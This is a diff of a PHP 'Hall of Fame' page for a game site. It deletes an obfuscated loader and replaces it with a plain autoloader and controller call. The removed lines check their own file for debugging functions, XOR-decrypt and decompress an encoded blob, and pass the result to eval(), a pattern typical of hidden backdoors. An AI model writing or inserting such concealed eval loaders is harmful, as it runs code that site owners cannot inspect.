@@ -1,24 +1,43 @@
 <?php
-$loaolhr="ecccf8f895b137a256c3f778d9b8be40";
-$rawooii="040506025f08515e5b53045250530054570557020306040d570a520f03035108";
-$ihczmfe="GbzINWRf7VZ2G6nM2ycpF9g9m561R7lzK6BQQ+RbSKuE4G45MkZR/dezspzdj3GgpWWdPta1Jtv0itcpPv0WIHqByNUJq8NBMVZoszmHw9Y5UoUDsxqOUap7d5TFcUyV5SWqg4BCYk99I3uLgRfpSQDBc82JlLhmH7cFEwlXfLAgXKtbDvMsXj+dtqw8tp+LZsktPUKuXWbLRNj8eCL5e9uXw1VLvgHE9OIKnTGXKoNeaYLpjfMYlrKGu2Vb8aWXSbIPNi8n3WfMRijISauCuLRPEyzviIHRk277AlPsOT5ULTxBskn5lJuNWqq+PdYVtNV1DJ84As0L+bR/c44l9Fp7S8qz32cttmIu5CZ7zU//X0lbZL0vj2tkC/hYCtymtu9s3YOKtdEr0vWqwbs5u0JoGJQyDmLhKpL40e+GvSkjdd4xHGLz2KUoxtcM6TXGBHFzFtVEfKhZZvVMr2cp2GLPiTm0rCtUntc3ddRxGrcxDm+24jRYnASBtH07by7i1UFf5I0UAi/M2+95bwUV553QHO9+3J4ceIe+eGrtzSV+rNf9FTaz2tdSSyWOHwKtW3qRbd0eXsQSqE26CgWZFeARFQ24Xo8m9oGLgA3Y61mHO3LSWNVS+T171DromvE8ujAKbzS7ol8mHRUOMvfj6p58kKlKZ/OHtDGbTau93SMR2Bp/dc0ZtsuuFOy63j07PlSDxOCtVoaHDInTBQ+QTrgrcSjHp0Yq3oN0tD4M8KIPT0eMIQ51Ir8fmOmrkwz2IXNONe8s0moKWPgoe03c9CXiUEhTC+RmHLjfB9JSf2WTibYLatqRuOShlvqfLx+2Sr6BFhxOMG2otD0=";
-$jrzpupvcwak=file_get_contents(__FILE__);
-$rppahzxani=str_replace($ihczmfe,"",$jrzpupvcwak);
-if(strpos($rppahzxani,"ec"."ho")!==false||strpos($rppahzxani,"pr"."int")!==false||strpos($rppahzxani,"var_"."dump")!==false||strpos($rppahzxani,"file_put_"."contents")!==false||strpos($rppahzxani,"fw"."rite")!==false){die();}
-$rixzotyn=str_replace(array($loaolhr,$rawooii),array("SP_056a59ac","KP_400d407f"),$jrzpupvcwak);
-$xsjdtrm=md5($rixzotyn);
-$uibmdlmxr=hex2bin($rawooii);
-$yohtrmruq="";
-$djbuvtvr=strlen($xsjdtrm);
-for($kelwauy=0;$kelwauy<$djbuvtvr;$kelwauy++){
-$yohtrmruq.=chr(ord($uibmdlmxr[$kelwauy])^ord($xsjdtrm[$kelwauy]));
+// Mostrar TODOS os erros
+// error_reporting(E_ALL);
+// ini_set('display_errors', '1');
+
+/*****************************************/
+/*     HALL_OF_FAME.PHP                  */
+/*     QUADRO DE HONRA                   */
+/*             ice41                     */
+/*****************************************/
+
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0)
+        return;
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+    if (file_exists($file))
+        require $file;
+});
+
+// Autoloader manual para garantir carregamento
+require_once __DIR__ . '/../app/Controllers/Screens/HallOfFameScreen.php';
+
+$world = isset($_GET['world']) ? $_GET['world'] : '1';
+
+try {
+    $controller = new \App\Controllers\Screens\HallOfFameScreen($world);
+    echo $controller->render();
+} catch (Exception $e) {
+    // Mostrar o erro real
+    echo "<h1>ERRO DETETADO</h1>";
+    // echo "<pre>";
+    // echo "Mensagem: " . $e->getMessage() . "\n";
+    // echo "Ficheiro: " . $e->getFile() . "\n";
+    // echo "Linha: " . $e->getLine() . "\n";
+    // echo "\nStack Trace:\n" . $e->getTraceAsString() . "\n";
+    // echo "</pre>";
+    exit;
 }
-$oruuhxypx=base64_decode($ihczmfe);
-$qcvxcjib=strlen($oruuhxypx);
-$gcswufofs="";
-$uppwayrpo=strlen($yohtrmruq);
-for($kelwauy=0;$kelwauy<$qcvxcjib;$kelwauy++){
-$gcswufofs.=$oruuhxypx[$kelwauy]^$yohtrmruq[$kelwauy%$uppwayrpo];
-}
-$ejohkkaf="gzun"."compress";
-eval($ejohkkaf($gcswufofs));
